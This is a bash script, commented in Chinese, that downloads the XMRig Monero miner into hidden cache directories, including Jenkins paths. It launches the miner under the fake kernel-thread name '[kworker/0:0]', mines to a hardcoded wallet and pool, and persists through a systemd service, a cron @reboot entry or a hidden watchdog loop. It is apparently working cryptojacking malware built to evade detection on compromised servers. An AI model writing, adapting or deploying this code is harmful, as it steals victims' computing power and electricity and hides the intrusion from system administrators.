#!/bin/bash
# Universal Persistent Script (Low/High Privilege)
# GitHub: https://github.com/yourusername/yourrepo

set -euo pipefail

### 配置区（修改这里） ###
REPO_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
BIN_NAME="xmrig"
WALLET="43CcvodQDNGQnDyPY2adzKcgbmKzncFt1dtCDGUnJAKcQAmaVr3KQ5WhVsw2e8DYQcCbd16PbBhEWPk2GV3xrtoaH3kCrUE"
POOL="pool.supportxmr.com:3333"
THREADS="60"
WORKER_NAME="worker"
####################################

### 初始化环境 ###
init_env() {
    # 按优先级尝试不同的存储目录
    for dir in "/var/tmp" "/tmp" "/var/lib/jenkins" "/var/lib/jenkins/tmp" "/var/cache" "/var/lib"; do
        if [ -w "$dir" ]; then
            STORE_DIR="$dir/.${BIN_NAME}_cache"
            break
        fi
    done
    
    # 如果所有目录都不可写，使用当前目录
    if [ -z "${STORE_DIR:-}" ]; then
        STORE_DIR="$(pwd)/.${BIN_NAME}_cache"
    fi
    
    mkdir -p "$STORE_DIR"
    
    # 选择下载工具（优先用 curl）
    if command -v curl >/dev/null; then
        DOWNLOAD="curl -sSL"
    elif command -v wget >/dev/null; then
        DOWNLOAD="wget -qO-"
    else
        echo "[-] Error: 需要 curl 或 wget!" >&2
        exit 1
    fi
}

### 下载并部署二进制 ###
deploy_bin() {
    if [ ! -f "${STORE_DIR}/${BIN_NAME}" ]; then
        echo "[*] 下载 ${BIN_NAME}..."
        $DOWNLOAD "$REPO_URL" | tar -xz --strip-components=1 -C "$STORE_DIR" "xmrig-6.22.2/xmrig"
        mv "${STORE_DIR}/xmrig" "${STORE_DIR}/${BIN_NAME}"
        chmod +x "${STORE_DIR}/${BIN_NAME}"
    fi
}

### 启动进程（伪装为系统进程） ###
start_process() {
    if ! pgrep -f "${BIN_NAME}.*${POOL}" >/dev/null; then
        exec -a "[kworker/0:0]" "${STORE_DIR}/${BIN_NAME}" \
            -o "$POOL" -u "$WALLET" --cpu-max-threads-hint "$THREADS" \
            -p "$WORKER_NAME" --donate-level=0 -b >/dev/null 2>&1 &
    fi
}

### 持久化方式检测 ###
setup_persistence() {
    # 1. 尝试 Systemd（高权限）
    if [ -d "/etc/systemd/system" ] && [ -w "/etc/systemd/system" ]; then
        echo "[+] 使用 Systemd 持久化"
        cat <<EOF | sudo tee "/etc/systemd/system/${BIN_NAME}.service" >/dev/null
[Unit]
Description=Background Service
After=network.target

[Service]
ExecStart=${STORE_DIR}/${BIN_NAME} -o $POOL -u $WALLET --cpu-max-threads-hint $THREADS -p $WORKER_NAME --donate-level=0 -b
Restart=always
RestartSec=30
User=$(whoami)

[Install]
WantedBy=multi-user.target
EOF
        sudo systemctl daemon-reload
        sudo systemctl enable "${BIN_NAME}.service"
        sudo systemctl start "${BIN_NAME}.service"
    
    # 2. 尝试 Cron（低权限）
    elif command -v crontab >/dev/null; then
        echo "[+] 使用 Cron 持久化"
        (crontab -l 2>/dev/null; echo "@reboot ${STORE_DIR}/${BIN_NAME} -o $POOL -u $WALLET --cpu-max-threads-hint $THREADS -p $WORKER_NAME --donate-level=0 -b") | crontab -
    
    # 3. 回退到 while 循环（最低权限）
    else
        echo "[+] 使用 While 循环监控"
        cat <<EOF > "${STORE_DIR}/.watchdog"
#!/bin/bash
while true; do
    if ! pgrep -f "${BIN_NAME}.*${POOL}" >/dev/null; then
        ${STORE_DIR}/${BIN_NAME} -o "$POOL" -u "$WALLET" --cpu-max-threads-hint "$THREADS" -p "$WORKER_NAME" --donate-level=0 -b &
    fi
    sleep 300
done
EOF
        chmod +x "${STORE_DIR}/.watchdog"
        nohup "${STORE_DIR}/.watchdog" >/dev/null 2>&1 &
    fi
}

### 主流程 ###
main() {
    init_env
    deploy_bin
    start_process
    setup_persistence
    echo "[√] 部署完成！进程名: [kworker/0:0]"
}

main "$@"